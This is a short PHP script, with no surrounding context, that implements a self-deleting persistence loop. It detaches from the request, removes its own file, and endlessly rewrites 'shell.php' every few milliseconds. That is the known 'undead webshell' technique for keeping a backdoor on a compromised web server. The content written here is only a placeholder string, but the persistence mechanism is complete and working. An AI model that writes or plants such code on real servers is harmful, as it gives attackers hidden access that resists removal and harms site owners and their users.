<?php
set_time_limit(0); 
ignore_user_abort(1); 
unlink(__FILE__); 
while (1) {
$content = 'horse_is_running';
file_put_contents("shell.php", $content);
usleep(10000); 
}
?>